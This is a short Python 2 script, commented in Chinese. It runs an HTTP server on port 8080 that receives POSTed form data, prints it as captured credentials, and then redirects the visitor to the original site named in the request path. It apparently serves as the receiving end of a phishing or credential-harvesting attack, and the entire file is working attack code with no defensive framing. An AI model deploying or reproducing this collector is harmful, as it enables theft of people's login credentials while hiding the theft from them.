# coding=utf-8
import SimpleHTTPServer
import SocketServer
import urllib


class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    """
    创建基础TCP服务器,读取数据包,并且将读入请求的内容打印,最后重定向到原始赚点
    """

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        creds = self.rfile.read(content_length).decode('utf-8')
        print creds
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.unquote(site))
        self.end_headers()


server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()
